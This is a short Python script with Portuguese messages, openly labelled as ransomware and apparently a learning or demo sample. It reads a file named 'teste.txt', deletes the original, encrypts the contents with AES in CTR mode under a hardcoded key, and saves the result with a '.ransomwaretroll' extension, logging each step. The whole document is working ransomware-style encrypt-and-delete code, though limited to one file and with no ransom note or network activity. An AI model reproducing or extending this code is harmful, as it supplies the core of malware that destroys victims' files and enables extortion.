import os
import pyaes
import logging


logging.basicConfig(filename='ransomware.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def encrypt_file(file_name, key):
    try:
        
        if not os.path.isfile(file_name):
            logging.error(f"Arquivo {file_name} não encontrado.")
            return False

        
        with open(file_name, "rb") as file:
            file_data = file.read()

        
        os.remove(file_name)
        logging.info(f"Arquivo {file_name} removido com sucesso.")

        
        aes = pyaes.AESModeOfOperationCTR(key)

        
        crypto_data = aes.encrypt(file_data)

        
        new_file = file_name + ".ransomwaretroll"
        with open(new_file, "wb") as encrypted_file:
            encrypted_file.write(crypto_data)
        
        logging.info(f"Arquivo criptografado salvo como {new_file}")
        return True
    
    except Exception as e:
        logging.error(f"Erro durante a criptografia do arquivo {file_name}: {e}")
        return False


key = b"testeransomwares"


file_name = "teste.txt"


if encrypt_file(file_name, key):
    print(f"O arquivo {file_name} foi criptografado com sucesso.")
else:
    print(f"Erro ao criptografar o arquivo {file_name}.")
